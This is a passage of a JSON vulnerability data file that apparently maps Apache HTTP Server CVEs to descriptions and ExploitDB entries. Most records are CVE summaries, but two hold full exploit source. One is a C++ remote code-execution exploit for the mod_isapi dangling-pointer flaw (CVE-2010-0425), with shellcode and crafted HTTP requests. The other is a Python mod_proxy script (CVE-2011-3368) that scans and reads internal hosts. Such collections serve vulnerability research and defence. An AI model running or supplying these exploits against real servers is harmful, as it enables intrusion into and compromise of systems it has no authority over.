                "description": "modules/arch/win32/mod_isapi.c in mod_isapi in the Apache HTTP Server 2.0.37 through 2.0.63, 2.2.0 through 2.2.14, and 2.3.x before 2.3.7, when running on Windows, does not ensure that request processing is complete before calling isapi_unload for an ISAPI .dll module, which allows remote attackers to execute arbitrary code via unspecified vectors related to a crafted request, a reset packet, and \"orphaned callback pointers.\"",
                "osvdb": [],
                "bid": [
                    38494
                ],
                "cve": [
                    "CVE-2010-0425"
                ],
                "msb": []
            },
            {
                "code": "/*\r\n * Apache 2.2.14 mod_isapi Dangling Pointer Remote SYSTEM Exploit (CVE-2010-0425)\r\n * ------------------------------------------------------------------------------\r\n *\r\n * Advisory: http://www.senseofsecurity.com.au/advisories/SOS-10-002\r\n * \r\n * Description:\r\n * pwn-isapi.cpp exploits a dangling pointer vulnerabilty in Apache 2.2.14 mod_isapi.\r\n * Due to the nature of the vulnerability, and exploitation method, DEP should be limited to essential \r\n * Windows programs and services. At worst, if DEP is enabled for the Apache process, you could cause \r\n * a constant DoS by looping this (since apache will automatically restart) :)\r\n *\r\n * Note that the exploit code may need to be run multiple times before a shell is spawned (70%\r\n * success rate - tested on three different systems). Furthermore, the exploit code may require \r\n * modification to exploit this vulnerability on different platforms. This is due to loaded memory \r\n * references to the unloaded DLL (they will be different for each ISAPI module). Do not test\r\n * this code in a VM otherwise the code may fail to send the RESET packet (something to do with\r\n * VMware gracefully closing the connection, instead of sending a RESET packet) - I didnt want\r\n * to have to use raw packets on Windows. \r\n *\r\n * Shellcode Note: \r\n * The shellcode writes \"pwn-isapi\" to \"sos.txt\" which is created in the current working directory. \r\n * Most operating systems should be supported by this shellcode. I've used Skylined's method of finding\r\n * the base address of kernel32.dll for Windows 7 and modified it so that it will find the base \r\n * address of msvcrt.dll instead. I've also added another check so that it will be able to detect\r\n * \"msvcrt.dll\" on Windows Server 2003 (this OS loads msvcrt.dll in 5th position, and before this\r\n * DLL string is read, another DLL (RPCRT4.dll) length is verifiied which matches the length of \r\n * msvcrt.dll. So the added check will verify the presents of \"m\" before proceeding. \r\n *\r\n * Author: \r\n * Brett Gervasoni (brettg [at] senseofsecurity.com.au)\r\n *\r\n * Copyright Sense of Security Pty Ltd 2010. \r\n * http://www.senseofsecurity.com.au\r\n */\r\n\r\n#include <iostream>\r\n#include <windows.h>\r\n#include <winsock.h>\r\n#include <string>\r\n#include <direct.h>\r\n\r\n#pragma comment(lib, \"wsock32.lib\")\r\n\r\nusing namespace std;\r\n\r\n#define SERVER_PORT 80\r\n\r\nvoid header();\r\nint createConnection(string targetAddr, int targetPort);\r\nint sendTransmission(string message);\r\nstring recvTransmission();\r\nvoid cleanUp();\r\n\r\nWORD sockVersion;\r\nWSADATA wsaData;\r\n\r\nint sock;\r\nstruct sockaddr_in rserver;\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n\tstring serverIP, isapiDLL;\r\n\tstring triggerVuln, payload;\r\n\tchar accept[171], referer[733], cookie[5376], random[7604], postData[23379], footer[299];\r\n\r\n\t//custom shellcode that writes \"pwn-isapi\" to \"sos.txt\" in the current working directory\r\n\t//Note: There are four NOPs at the end for padding. Not really needed. \r\n\tchar shellcode[] = \"\\x31\\xc0\\x31\\xc9\\x64\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x56\\x08\\x8b\"\r\n\t\t\t\t\t   \"\\x7e\\x20\\x8b\\x36\\x66\\x39\\x4f\\x14\\x75\\xf2\\x66\\xb9\\x01\\x6d\\x66\\x81\\xe9\\x94\"\r\n\t\t\t\t\t   \"\\x6c\\x66\\x39\\x0f\\x66\\x89\\xc1\\x75\\xe1\\x89\\xe5\\xeb\\x71\\x60\\x8b\\x6c\\x24\\x24\"\r\n\t\t\t\t\t   \"\\x8b\\x45\\x3c\\x8b\\x54\\x05\\x78\\x01\\xea\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\"\r\n\t\t\t\t\t   \"\\x34\\x49\\x8b\\x34\\x8b\\x01\\xee\\x31\\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\"\r\n\t\t\t\t\t   \"\\xcf\\x0d\\x01\\xc7\\xeb\\xf4\\x3b\\x7c\\x24\\x28\\x75\\xe1\\x8b\\x5a\\x24\\x01\\xeb\\x66\"\r\n\t\t\t\t\t   \"\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\\x89\\x44\\x24\\x1c\\x61\"\r\n\t\t\t\t\t   \"\\xc3\\xad\\x50\\x52\\xe8\\xaa\\xff\\xff\\xff\\x89\\x07\\x66\\x81\\xc4\\x0c\\x01\\x66\\x81\"\r\n\t\t\t\t\t   \"\\xec\\x04\\x01\\x66\\x81\\xc7\\x08\\x01\\x66\\x81\\xef\\x04\\x01\\x39\\xce\\x75\\xde\\xc3\"\r\n\t\t\t\t\t   \"\\xeb\\x10\\x5e\\x8d\\x7d\\x04\\x89\\xf1\\x80\\xc1\\x0c\\xe8\\xcd\\xff\\xff\\xff\\xeb\\x3b\"\r\n\t\t\t\t\t   \"\\xe8\\xeb\\xff\\xff\\xff\\x6e\\x7c\\x2e\\xe1\\x1e\\x3c\\x3f\\xd7\\x74\\x1e\\x48\\xcd\\x31\"\r\n\t\t\t\t\t   \"\\xd2\\x58\\x88\\x50\\x07\\xeb\\x2f\\x31\\xd2\\x59\\x88\\x51\\x01\\xeb\\x2e\\x51\\x50\\xff\"\r\n\t\t\t\t\t   \"\\x55\\x04\\xeb\\x2c\\x31\\xd2\\x59\\x88\\x51\\x09\\xeb\\x33\\x51\\x50\\x89\\xc6\\xff\\x55\"\r\n\t\t\t\t\t   \"\\x08\\x53\\xff\\x55\\x0c\\xe8\\xd1\\xff\\xff\\xff\\x73\\x6f\\x73\\x2e\\x74\\x78\\x74\\x4e\"\r\n\t\t\t\t\t   \"\\xe8\\xcc\\xff\\xff\\xff\\x77\\x4e\\xe8\\xcd\\xff\\xff\\xff\\xe8\\xcf\\xff\\xff\\xff\\x70\"\r\n\t\t\t\t\t   \"\\x77\\x6e\\x2d\\x69\\x73\\x61\\x70\\x69\\x4e\\xe8\\xc8\\xff\\xff\\xff\\x90\\x90\\x90\\x90\";\r\n\r\n\theader();\r\n\r\n\tif (argc < 3)\r\n\t{\r\n\t\tprintf(\"usage: %s <ip> <DLL>\\n\", argv[0]);\r\n\t\treturn 1;\r\n\t}\r\n\r\n\tserverIP = string(argv[1]);\r\n\tisapiDLL = string(argv[2]);\r\n\r\n\t//all these values could be set to 7601 + sizeof(shellcode)\r\n\t//but mixing it up is good. \r\n\tmemset(accept, 'A', 170);\r\n\tmemset(referer, 'A', 732);\r\n\tmemset(cookie, 'A', 5375);\r\n\tmemset(random, 'A', 7603);\r\n\tmemset(postData, 'A', 23378);\r\n\tmemset(footer, 'A', 298);\r\n\r\n\ttriggerVuln = \"POST /cgi-bin/\" + isapiDLL + \" HTTP/1.0\\r\\n\"\r\n\t\t\"User-Agent: AAAAAAAA\\r\\n\"\r\n\t\t\"Pragma: no-cache\\r\\n\"\r\n\t\t\"Proxy-Connection: Keep-Alive\\r\\n\"\r\n\t\t\"Host: \" + serverIP + \"\\r\\n\"\r\n\t\t\"Content-Length: 40334\\r\\n\\r\\n\" +\r\n\t\tstring(footer);\r\n\r\n\t//Modify the below request if needed (depending on where your function pointer is pointing)\r\n\t//Do so by adding or removing headers. So if you want to hit a higher function pointer, \r\n\t//keep adding headers :) \r\n\t//Note: If performing this blindly, try it a few times, change a bit, try again. \r\n\t//During testing i found that using a chunk of data the same size with the same header name\r\n\t//was more unreliable. In memory, large amounts of nulls are being placed either side of the \r\n\t//payload. Since the function pointer address was random, by slightly mixing up the size of \r\n\t//each header i would get better results.\r\n\tpayload = \"POST /cgi-bin/\" + isapiDLL + \" HTTP/1.0\\r\\n\"\r\n\t\t\"Accept: \" + string(accept) + \"\\r\\n\"\r\n\t\t\"Referer: \" + string(referer) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"From: \" + string(cookie) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Utruvh-guiergher: \" + string(cookie) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Accept-Language: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"\r\n\t\t\"Content-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"\r\n\t\t\"UA-CPU: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"\r\n\t\t\"Pragma: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"\r\n\t\t\"User-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"\r\n\t\t\"Cookie: \" + string(cookie) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Host: \" + serverIP + \"\\r\\n\"\r\n\t\t\"Proxy-Connection: Keep-Alive\\r\\n\"\r\n\t\t\"Okytuasd: \" + string(cookie) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Asdasdasdasdasd: \" + string(random) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Asdasda: \" + string(random) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Sewrwefbui: \" + string(random) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Qdfasdernu: \" + string(random) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Cdffew-asdf: \" + string(random) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Kuiytnb-Ehrf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Lsfergjnuibubiu: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Baefrwerifnhu: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Zdsfno: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Psdfsafn: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Zefwefnuivre-sdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Ivre-sdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Yvasde-sdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Yuionbsdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Yasdasdasdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"asdasdde-sdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Ertuioert-erf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Content-Length: 25054\\r\\n\\r\\n\" + \r\n\t\tstring(postData) + \"CCCC\" + string(shellcode) + \"BBBB\" + string(footer);\r\n\r\n\t//Setup connection\r\n\tif (createConnection(serverIP, SERVER_PORT) == 1)\r\n\t{\r\n\t\tprintf(\"- an error occurred connecting to the server\\n\");\r\n\t\treturn 1;\r\n\t}\r\n\r\n\tprintf(\"[+] Connected to %s.\\n\", serverIP.c_str());\r\n\r\n\tprintf(\"[+] Setting socket data structure values\\n\");\r\n\tint iOptVal;\r\n\tint aiOptVal;\r\n\t\r\n\tstruct linger linger_data;\r\n\t\r\n\t//This is meant to set closesocket to do a \"graceful close\",\r\n\t//however this is not the case when WSACancelBlockingCall() is called. A RESET packet is \r\n\t//sent as a result - Note that if in a vm, for some reason a RESET packet does not get sent. \r\n\tlinger_data.l_onoff = 0;\r\n\tlinger_data.l_linger = 0;\r\n\r\n\tsetsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&linger_data, sizeof(linger_data));\r\n\tsetsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&linger_data, sizeof(linger_data));\r\n\r\n\t//Set SO_LINGER to 0 so WSACancelBlockingCall() will cause a RESET packet to be sent\r\n\tgetsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&linger_data, &iOptVal);\r\n\tgetsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&linger_data, &aiOptVal);\r\n\tprintf(\"    - SO_LINGER value is set to %ld\\n\", linger_data.l_onoff);\r\n\tprintf(\"    - SO_DONTLINGER value is set to %ld\\n\", linger_data.l_linger);\r\n\t\r\n\tprintf(\"[*] Triggering DLL unload\\n\");\r\n\tsendTransmission(triggerVuln);\r\n\r\n\tSleep(2000); //Sleep for a bit, otherwise on first run a RESET packet doesn't get sent. \r\n\tWSACancelBlockingCall(); //Cause reset packet response\r\n\r\n\tSleep(2000); //The multiple Sleeps seem to break up stuff a bit, making it more reliable...\r\n\tclosesocket(sock);\r\n\r\n\tSleep(2000);\r\n\tWSACleanup();\r\n\t\r\n\tSleep(2000);\r\n\tprintf(\"[+] The DLL should be unloaded by now\\n\");\r\n\t\r\n\t//Reconnect to deliver payload\r\n\tif (createConnection(serverIP, SERVER_PORT) == 1)\r\n\t{\r\n\t\tprintf(\"- an error occurred connecting to the server\\n\");\r\n\t\treturn 1;\r\n\t}\r\n\t\r\n\tprintf(\"[*] Sending payload\\n\");\r\n\tsendTransmission(payload);\r\n\r\n\tcleanUp();\r\n\r\n\tprintf(\"[+] Check to see if sos.txt was created...\\n\");\r\n\r\n\treturn 0;\r\n}\r\n\r\nvoid header()\r\n{\r\n\tprintf(\"Apache 2.2.14 mod_isapi Remote SYSTEM Exploit (CVE-2010-0425)\\n\");\r\n\tprintf(\"-------------------------------------------------------------\\n\");\r\n\tprintf(\"         Brett Gervasoni (brettg [at] senseofsecurity.com.au)\\n\");\r\n\tprintf(\"                    Copyright Sense of Security Pty Ltd 2010.\\n\");\r\n}\r\n\r\n//Setup the server\r\nint createConnection(string serverIP, int port)\r\n{\r\n\tint result = 0, len = 0;\r\n\r\n\tsockVersion = MAKEWORD(1,1);\r\n\tWSAStartup(sockVersion, &wsaData);\r\n\t\r\n\tif ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)\r\n\t{\r\n\t\tperror(\"error: socket()\\n\");\r\n\t\tresult = 1;\r\n\t}\r\n\r\n\trserver.sin_family = AF_INET;\r\n\trserver.sin_port = htons(port);\r\n\trserver.sin_addr.s_addr = inet_addr(serverIP.c_str());\r\n\tmemset(&rserver.sin_zero, 0, 8);\r\n\r\n\tlen = sizeof(struct sockaddr_in);\r\n\t\r\n\tif ((connect(sock, (struct sockaddr *)&rserver, sizeof(struct sockaddr_in))) == -1)\r\n\t{\r\n\t\tperror(\"error: connect()\\n\");\r\n\t\tresult = 1;\r\n\t}\r\n\r\n\treturn result;\r\n}\r\n\r\n//Send a message\r\nint sendTransmission(string message)\r\n{\r\n\tint bytes_sent = 0;\r\n\r\n\tbytes_sent = send(sock, message.c_str(), message.length(), 0);\r\n\tif (bytes_sent < 0)\r\n\t{\r\n\t\tperror(\"error: send()\\n\");\r\n\t\texit(1);\r\n\t}\r\n\t\r\n\treturn bytes_sent;\r\n}\r\n\r\n//Receive a message\r\nstring recvTransmission()\r\n{\r\n\tstring result;\r\n\tchar *c = new char[1];\r\n\tint bytes_recv = 0;\r\n\r\n\twhile (c[0] != NULL)\r\n\t{\r\n\t\tbytes_recv = recv(sock, c, 1, 0);\r\n\r\n\t\tif (bytes_recv < 0)\r\n\t\t{\r\n\t\t\tperror(\"error: recv()\\n\");\r\n\t\t\t//exit(1);\r\n\t\t}\r\n\r\n\t\tresult += c[0];\r\n\t}\r\n\r\n\treturn result;\r\n}\r\n\r\n//Clean up the connection\r\nvoid cleanUp()\r\n{\r\n\tclosesocket(sock);\r\n\tWSACleanup();\r\n}",
                "description": "Apache 2.2.14 mod_isapi - Dangling Pointer Remote SYSTEM",
                "author": "Brett Gervasoni",
                "_id": 11650,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2010-03-07T00:00:00+00:00",
                "cve": [
                    "CVE-2010-0425"
                ],
                "type": "remote",
                "port": 0
            }
        ],
        "CVE-2018-1312": [
            {
                "source": "CVE",
                "_id": "2018-1312",
                "description": "In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.",
                "osvdb": [],
                "bid": [
                    103524
                ],
                "cve": [
                    "CVE-2018-1312"
                ],
                "msb": []
            }
        ],
        "CVE-2011-3368": [
            {
                "source": "CVE",
                "_id": "2011-3639",
                "description": "The mod_proxy module in the Apache HTTP Server 2.0.x through 2.0.64 and 2.2.x before 2.2.18, when the Revision 1179239 patch is in place, does not properly interact with use of (1) RewriteRule and (2) ProxyPassMatch pattern matches for configuration of a reverse proxy, which allows remote attackers to send requests to intranet servers by using the HTTP/0.9 protocol with a malformed URI containing an initial @ (at sign) character.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-3368.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-3639"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-3368",
                "description": "The mod_proxy module in the Apache HTTP Server 1.3.x through 1.3.42, 2.0.x through 2.0.64, and 2.2.x through 2.2.21 does not properly interact with use of (1) RewriteRule and (2) ProxyPassMatch pattern matches for configuration of a reverse proxy, which allows remote attackers to send requests to intranet servers via a malformed URI containing an initial @ (at sign) character.",
                "osvdb": [
                    76079
                ],
                "bid": [
                    49957
                ],
                "cve": [
                    "CVE-2011-3368"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4317",
                "description": "The mod_proxy module in the Apache HTTP Server 1.3.x through 1.3.42, 2.0.x through 2.0.64, and 2.2.x through 2.2.21, when the Revision 1179239 patch is in place, does not properly interact with use of (1) RewriteRule and (2) ProxyPassMatch pattern matches for configuration of a reverse proxy, which allows remote attackers to send requests to intranet servers via a malformed URI containing an @ (at sign) character and a : (colon) character in invalid positions.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-3368.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4317"
                ],
                "msb": []
            },
            {
                "code": "#!/usr/bin/env python\r\n\r\nimport socket\r\nimport string\r\nimport getopt, sys\r\n\r\n\r\nknown_ports = [0,21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080]\r\n\r\ndef send_request(url, apache_target, apache_port, internal_target, internal_port, resource):\r\n\r\n\tget = \"GET \" + url + \"@\" + internal_target + \":\" + internal_port +  \"/\" + resource + \" HTTP/1.1\\r\\n\"\r\n\tget = get + \"Host: \" + apache_target + \"\\r\\n\\r\\n\"\r\n\t\r\n\tremoteserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n\tremoteserver.settimeout(3)\r\n\r\n\ttry:\r\n\t\tremoteserver.connect((apache_target, int(apache_port)))\r\n\t\tremoteserver.send(get)\r\n\t\treturn remoteserver.recv(4096)\r\n\texcept:\r\n\t\treturn \"\"\r\n\r\ndef get_banner(result):\r\n\treturn result[string.find(result, \"\\r\\n\\r\\n\")+4:]\r\n\r\n\r\ndef scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource):\r\n\r\n\tprint_banner(url, apache_target, apache_port, internal_target, tested_ports, resource)\r\n\tfor port in tested_ports:\r\n\t\tport = str(port)\r\n\t\tresult = send_request(url, apache_target, apache_port, internal_target, port, resource)\r\n\t\tif string.find(result,\"HTTP/1.1 200\")!=-1 or \\\r\n\t\tstring.find(result,\"HTTP/1.1 30\")!=-1 or \\\r\n\t\tstring.find(result,\"HTTP/1.1 502\")!=-1:\r\n\t\t\tprint \"- Open port: \" + port + \"/TCP\"\r\n\t\t\tprint get_banner(result)\r\n\t\telif len(result)==0:\r\n\t \t\tprint \"- Filtered port: \" + port + \"/TCP\"\r\n\t\telse:\r\n\t \t\tprint \"- Closed port: \" + port + \"/TCP\"\r\n\t\t\t\r\n\r\ndef usage():\r\n\tprint\r\n\tprint \"CVE-2011-3368 proof of concept by Rodrigo Marcos\"\r\n\tprint \"http://www.secforce.co.uk\"\r\n\tprint\r\n\tprint \"usage():\"\r\n\tprint \"python apache_scan.py [options]\"\r\n\tprint\r\n\tprint \" [options]\"\r\n\tprint \"\t\t-r: Remote Apache host\"\r\n\tprint \"\t\t-p: Remote Apache port (default is 80)\"\r\n\tprint \"\t\t-u: URL on the remote web server (default is /)\"\r\n\tprint \"\t\t-d: Host in the DMZ (default is 127.0.0.1)\"\r\n\tprint \"\t\t-e: Port in the DMZ (enables 'single port scan')\"\r\n\tprint \"\t\t-g: GET request to the host in the DMZ (default is /)\"\r\n\tprint \"\t\t-h: Help page\"\r\n\tprint\r\n\tprint \"examples:\"\r\n\tprint \" - Port scan of the remote host\"\r\n\tprint \"\t\tpython apache_scan.py -r www.example.com -u /images/test.gif\"\r\n\tprint \" - Port scan of a host in the DMZ\"\r\n\tprint \"\t\tpython apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local\"\r\n\tprint \" - Retrieve a resource from a host in the DMZ\"\r\n\tprint \"\t\tpython apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local -e 80 -g /accounts/index.html\"\r\n\tprint\r\n\r\ndef print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource):\r\n\tprint\r\n\tprint \"CVE-2011-3368 proof of concept by Rodrigo Marcos\"\r\n\tprint \"http://www.secforce.co.uk\"\r\n\tprint\r\n\tprint \" [+] Target: \" + apache_target\r\n\tprint \" [+] Target port: \" + apache_port\r\n\tprint \" [+] Internal host: \" + internal_target\r\n\tprint \" [+] Tested ports: \" + str(tested_ports)\r\n\tprint \" [+] Internal resource: \" + resource\r\n\tprint\r\n\r\n\r\ndef main():\r\n\r\n\tglobal apache_target\r\n\tglobal apache_port\r\n\tglobal url\r\n\tglobal internal_target\r\n\tglobal internal_port\r\n\tglobal resource\r\n\r\n\ttry:\r\n\t\topts, args = getopt.getopt(sys.argv[1:], \"u:r:p:d:e:g:h\", [\"help\"])\r\n\texcept getopt.GetoptError:\r\n\t\tusage()\r\n\t\tsys.exit(2)\r\n\r\n\ttry:\r\n\t\tfor o, a in opts:\r\n\t\t\tif o in (\"-h\", \"--help\"):\r\n\t\t\t\tusage()\r\n\t\t\t\tsys.exit(2)\r\n\t\t\tif o == \"-u\":\r\n\t\t\t\turl=a\r\n\t\t\tif o == \"-r\":\r\n\t\t\t\tapache_target=a\r\n\t\t\tif o == \"-p\":\r\n\t\t\t\tapache_port=a\r\n\t\t\tif o == \"-d\":\r\n\t\t\t\tinternal_target = a\r\n\t\t\tif o == \"-e\":\r\n\t\t\t\tinternal_port=a\r\n\t\t\tif o == \"-g\":\r\n\t\t\t\tresource=a\t\t\t\t\r\n\t\t\r\n\texcept getopt.GetoptError:\r\n\t\tusage()\r\n\t\tsys.exit(2)\r\n\t\t\r\n\tif apache_target == \"\":\r\n\t\tusage()\r\n\t\tsys.exit(2)\r\n\r\n\r\nurl = \"/\"\r\napache_target = \"\"\r\napache_port = \"80\"\r\ninternal_target = \"127.0.0.1\"\r\ninternal_port = \"\"\r\nresource = \"/\"\r\n\r\nmain()\r\n\r\nif internal_port!=\"\":\r\n\ttested_ports = [internal_port]\r\nelse:\r\n\ttested_ports = known_ports\r\n\r\nscan_host(url, apache_target, apache_port, internal_target, tested_ports, resource)",
                "description": "Apache mod_proxy - Reverse Proxy Exposure",
                "author": "Rodrigo Marcos",
                "_id": 17969,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2011-10-11T00:00:00+00:00",
                "cve": [
                    "CVE-2011-3368"
                ],
                "type": "remote",
                "port": 0
            }
        ],
        "CVE-2009-2699": [
            {
                "source": "CVE",
                "_id": "2009-2699",
                "description": "The Solaris pollset feature in the Event Port backend in poll/unix/port.c in the Apache Portable Runtime (APR) library before 1.3.9, as used in the Apache HTTP Server before 2.2.14 and other products, does not properly handle errors, which allows remote attackers to cause a denial of service (daemon hang) via unspecified HTTP requests, related to the prefork and event MPMs.",
                "osvdb": [],
                "bid": [
                    36596
                ],
                "cve": [
                    "CVE-2009-2699"
                ],
                "msb": []
            }
        ],
        "CVE-2011-3348": [
            {
                "source": "CVE",
                "_id": "2011-3348",
                "description": "The mod_proxy_ajp module in the Apache HTTP Server before 2.2.21, when used with mod_proxy_balancer in certain configurations, allows remote attackers to cause a denial of service (temporary \"error state\" in the backend server) via a malformed HTTP request.",
                "osvdb": [],
                "bid": [
                    49616
                ],
                "cve": [
                    "CVE-2011-3348"
                ],
                "msb": []
            }
        ],
        "CVE-2012-3499": [
            {
                "source": "CVE",
                "_id": "2012-3499",
                "description": "Multiple cross-site scripting (XSS) vulnerabilities in the Apache HTTP Server 2.2.x before 2.2.24-dev and 2.4.x before 2.4.4 allow remote attackers to inject arbitrary web script or HTML via vectors involving hostnames and URIs in the (1) mod_imagemap, (2) mod_info, (3) mod_ldap, (4) mod_proxy_ftp, and (5) mod_status modules.",
                "osvdb": [],
                "bid": [
                    58165,
                    64758
                ],
                "cve": [
                    "CVE-2012-3499"
                ],
                "msb": []
            }
        ],
        "CVE-2012-4558": [
            {
                "source": "CVE",
                "_id": "2012-4558",
                "description": "Multiple cross-site scripting (XSS) vulnerabilities in the balancer_handler function in the manager interface in mod_proxy_balancer.c in the mod_proxy_balancer module in the Apache HTTP Server 2.2.x before 2.2.24-dev and 2.4.x before 2.4.4 allow remote attackers to inject arbitrary web script or HTML via a crafted string.",
                "osvdb": [],
                "bid": [
                    58165,
                    64758
                ],
                "cve": [
                    "CVE-2012-4558"
                ],
                "msb": []
            }
        ],
        "CVE-2011-3607": [
            {
                "source": "CVE",
                "_id": "2011-3607",
                "description": "Integer overflow in the ap_pregsub function in server/util.c in the Apache HTTP Server 2.0.x through 2.0.64 and 2.2.x through 2.2.21, when the mod_setenvif module is enabled, allows local users to gain privileges via a .htaccess file with a crafted SetEnvIf directive, in conjunction with a crafted HTTP request header, leading to a heap-based buffer overflow.",
                "osvdb": [
                    76744
                ],
                "bid": [
                    50494
                ],
                "cve": [
                    "CVE-2011-3607"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4415",
                "description": "The ap_pregsub function in server/util.c in the Apache HTTP Server 2.0.x through 2.0.64 and 2.2.x through 2.2.21, when the mod_setenvif module is enabled, does not restrict the size of values of environment variables, which allows local users to cause a denial of service (memory consumption or NULL pointer dereference) via a .htaccess file with a crafted SetEnvIf directive, in conjunction with a crafted HTTP request header, related to (1) the \"len +=\" statement and (2) the apr_pcalloc function call, a different vulnerability than CVE-2011-3607.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4415"
                ],
                "msb": []
            }
        ],
        "CVE-2016-8612": [
            {
                "source": "CVE",
                "_id": "2016-8612",
                "description": "Apache HTTP Server mod_cluster before version httpd 2.4.23 is vulnerable to an Improper Input Validation in the protocol parsing logic in the load balancer resulting in a Segmentation Fault in the serving httpd process.",
                "osvdb": [],
                "bid": [
                    94939
                ],
                "cve": [
                    "CVE-2016-8612"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-8612",
                "description": "A Denial Of Service vulnerability exists when Connected User Experiences and Telemetry Service fails to validate certain function values, aka \"Connected User Experiences and Telemetry Service Denial of Service Vulnerability.\" This affects Windows Server 2016, Windows 10, Windows Server 2019, Windows 10 Servers.",
                "osvdb": [],
                "bid": [
                    106087
                ],
                "cve": [
                    "CVE-2018-8612"
                ],
                "msb": []
            }
        ],
        "CVE-2016-4975": [
            {
                "source": "CVE",
                "_id": "2016-4975",
                "description": "Possible CRLF injection allowing HTTP response splitting attacks for sites which use mod_userdir. This issue was mitigated by changes made in 2.4.25 and 2.2.32 which prohibit CR or LF injection into the \"Location\" or other outbound header key or value. Fixed in Apache HTTP Server 2.4.25 (Affected 2.4.1-2.4.23). Fixed in Apache HTTP Server 2.2.32 (Affected 2.2.0-2.2.31).",
                "osvdb": [],
                "bid": [
                    105093
                ],
                "cve": [
                    "CVE-2016-4975"
                ],
                "msb": []
            }
        ],
        "CVE-2009-3094": [
            {
                "source": "CVE",
                "_id": "2009-3094",
                "description": "The ap_proxy_ftp_handler function in modules/proxy/proxy_ftp.c in the mod_proxy_ftp module in the Apache HTTP Server 2.0.63 and 2.2.13 allows remote FTP servers to cause a denial of service (NULL pointer dereference and child process crash) via a malformed reply to an EPSV command.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2009-3094"
                ],
                "msb": []
            }
        ],
        "CVE-2012-4557": [
            {
                "source": "CVE",
                "_id": "2012-4557",
                "description": "The mod_proxy_ajp module in the Apache HTTP Server 2.2.12 through 2.2.21 places a worker node into an error state upon detection of a long request-processing time, which allows remote attackers to cause a denial of service (worker consumption) via an expensive request.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2012-4557"
                ],
                "msb": []
            }
        ],
        "CVE-2011-4317": [
            {
                "source": "CVE",
                "_id": "2011-4317",
